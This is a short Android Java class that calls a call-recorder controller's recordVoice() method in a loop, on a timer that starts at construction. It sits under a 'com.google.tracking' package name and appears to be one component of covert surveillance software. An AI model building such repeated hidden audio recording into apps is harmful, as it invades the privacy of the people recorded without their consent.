package com.google.tracking.runnable;


import android.os.Handler;
import android.util.Log;
import com.google.tracking.call.CallRecorderController;

public class RepeatingTask {
    private static String TAG = "RepeatingTask";
    private static int runTaskInterval;
    private Handler mHandler;
    private CallRecorderController _callRecorder;

    public RepeatingTask(int interval, CallRecorderController callRecorder) {

        // your code here
        _callRecorder = callRecorder;
        runTaskInterval = interval;
        mHandler = new Handler();
        startRepeatingTask();
    }

    Runnable mStatusChecker = new Runnable() {
        @Override
        public void run() {
            try {
                Log.d(TAG, "run()");
                _callRecorder.recordVoice();
            } finally {
                // 100% guarantee that this always happens, even if
                // your update method throws an exception
                mHandler.postDelayed(mStatusChecker, runTaskInterval);
            }
        }
    };

    private void startRepeatingTask() {
        mStatusChecker.run();
    }

    public void stopRepeatingTask() {
        mHandler.removeCallbacks(mStatusChecker);
    }
}
